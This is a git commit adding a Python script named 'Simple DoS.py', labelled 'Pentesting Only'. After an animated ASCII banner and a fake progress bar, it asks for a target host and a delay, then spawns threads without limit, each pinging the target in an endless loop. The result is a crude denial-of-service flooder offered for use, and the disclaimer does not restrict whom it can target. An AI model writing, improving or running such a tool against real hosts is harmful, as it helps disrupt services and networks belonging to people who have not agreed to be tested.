c3527fea7c94e7c6407bf04245b92b3f6999f2c4
Kloso <email27131@tutamail.com>
2026-04-26 16:53:02 +0100

    Add files via upload

---
+++ Simple DoS/Simple DoS.py
@@ -0,0 +1,148 @@
+
+# ░█▀▀░▀█▀░█▄█░█▀█░█░░░█▀▀░░░█▀▄░█▀█░█▀▀
+# ░▀▀█░░█░░█░█░█▀▀░█░░░█▀▀░░░█░█░█░█░▀▀█
+# ░▀▀▀░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀░░░▀▀░░▀▀▀░▀▀▀
+
+#Pentesting Only!
+
+import subprocess
+import time
+import webbrowser
+import threading
+from ping3 import ping
+
+
+#colors
+
+RED2 = "\033[91m"
+RED3 = "\033[31m"
+RED1 = "\033[38;5;203m"
+RED4 = "\033[38;5;88m"
+END = "\033[0m"
+
+print(RED1 + "Pentesting Only" + END)
+print(RED1 + "---------------" + END)
+time.sleep(5)
+
+subprocess.run("cls", shell=True)
+
+print(RED1 + "░█▀▀░▀█▀░█▄█░█▀█░█░░░█▀▀░░░█▀▄░█▀█░█▀▀" + END)
+print(RED2 + "░▀▀█░░█░░█░█░█▀▀░█░░░█▀▀░░░█░█░█░█░▀▀█" + END)
+print(RED3 + "░▀▀▀░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀░░░▀▀░░▀▀▀░▀▀▀" + END)
+time.sleep(2)
+
+print("")
+
+print(RED4 + "│####                  │" + END)
+
+time.sleep(1)
+
+subprocess.run("cls", shell=True)
+
+print(RED1 + "░█▀▀░▀█▀░█▄█░█▀█░█░░░█▀▀░░░█▀▄░█▀█░█▀▀" + END)
+print(RED2 + "░▀▀█░░█░░█░█░█▀▀░█░░░█▀▀░░░█░█░█░█░▀▀█" + END)
+print(RED3 + "░▀▀▀░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀░░░▀▀░░▀▀▀░▀▀▀" + END)
+
+print("")
+
+print(RED4 + "│#######               │" + END)
+
+time.sleep(0.7)
+
+subprocess.run("cls", shell=True)
+
+print(RED1 + "░█▀▀░▀█▀░█▄█░█▀█░█░░░█▀▀░░░█▀▄░█▀█░█▀▀" + END)
+print(RED2 + "░▀▀█░░█░░█░█░█▀▀░█░░░█▀▀░░░█░█░█░█░▀▀█" + END)
+print(RED3 + "░▀▀▀░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀░░░▀▀░░▀▀▀░▀▀▀" + END)
+
+print("")
+
+print(RED4 + "│###########           │" + END)
+
+time.sleep(0.3)
+
+subprocess.run("cls", shell=True)
+
+print(RED1 + "░█▀▀░▀█▀░█▄█░█▀█░█░░░█▀▀░░░█▀▄░█▀█░█▀▀" + END)
+print(RED2 + "░▀▀█░░█░░█░█░█▀▀░█░░░█▀▀░░░█░█░█░█░▀▀█" + END)
+print(RED3 + "░▀▀▀░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀░░░▀▀░░▀▀▀░▀▀▀" + END)
+
+print("")
+
+print(RED4 + "│#################     │" + END)
+
+time.sleep(0.3)
+
+subprocess.run("cls", shell=True)
+
+print(RED1 + "░█▀▀░▀█▀░█▄█░█▀█░█░░░█▀▀░░░█▀▄░█▀█░█▀▀" + END)
+print(RED2 + "░▀▀█░░█░░█░█░█▀▀░█░░░█▀▀░░░█░█░█░█░▀▀█" + END)
+print(RED3 + "░▀▀▀░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀░░░▀▀░░▀▀▀░▀▀▀" + END)
+
+print("")
+
+print(RED4 + "│####################  │" + END)
+
+time.sleep(1.2)
+
+subprocess.run("cls", shell=True)
+
+print(RED1 + "░█▀▀░▀█▀░█▄█░█▀█░█░░░█▀▀░░░█▀▄░█▀█░█▀▀" + END)
+print(RED2 + "░▀▀█░░█░░█░█░█▀▀░█░░░█▀▀░░░█░█░█░█░▀▀█" + END)
+print(RED3 + "░▀▀▀░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀░░░▀▀░░▀▀▀░▀▀▀" + END)
+
+print("")
+
+print(RED3 + "│######################│" + END)
+
+time.sleep(2)
+
+subprocess.run("cls", shell=True)
+
+print(RED1 + "░█▀▀░▀█▀░█▄█░█▀█░█░░░█▀▀░░░█▀▄░█▀█░█▀▀" + END)
+print(RED2 + "░▀▀█░░█░░█░█░█▀▀░█░░░█▀▀░░░█░█░█░█░▀▀█" + END)
+print(RED3 + "░▀▀▀░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀░░░▀▀░░▀▀▀░▀▀▀" + END)
+
+print("")
+
+print(RED4 + "Welcome" + END)
+
+site = input(RED2 + "Name: " + RED3)
+speed = float(input(RED2 + "Speed: " + RED3))
+print("" + END)
+
+
+time.sleep(1)
+
+
+print("" + END)
+
+subprocess.run("cls", shell=True)
+
+print(RED1 + "░█▀▀░▀█▀░█▄█░█▀█░█░░░█▀▀░░░█▀▄░█▀█░█▀▀" + END)
+print(RED2 + "░▀▀█░░█░░█░█░█▀▀░█░░░█▀▀░░░█░█░█░█░▀▀█" + END)
+print(RED3 + "░▀▀▀░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀░░░▀▀░░▀▀▀░▀▀▀" + END)
+
+print("")
+
+
+time.sleep(1)
+
+
+
+print(RED2 + "READY" + RED3)
+
+time.sleep(2)
+
+
+def DoS_Attack():
+    while True:
+        response_time = ping(site)
+        print(RED2 + "Ping:" + RED3)
+        print(response_time)
+        print("")
+        time.sleep(speed)
+
+while True:
+    SPAM = threading.Thread(target=DoS_Attack)
+    SPAM.start()
